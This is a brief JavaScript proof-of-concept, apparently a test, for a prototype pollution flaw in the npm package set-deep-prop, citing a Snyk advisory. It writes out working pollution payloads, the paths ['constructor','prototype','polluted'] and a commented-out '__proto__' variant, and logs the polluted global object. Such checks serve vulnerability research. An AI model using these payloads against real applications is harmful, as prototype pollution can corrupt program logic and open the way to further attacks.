// //https://snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231
// test("prototype pollution in safe-object2", () => {
  const setDeepProp = require("set-deep-prop");
  var obj = {};

console.log({}.polluted);
setDeepProp({}, ["constructor","prototype", "polluted"], "yes");
  //setDeepProp({}, ["__proto__", "polluted"], "yes");
console.log({}.polluted);
// });
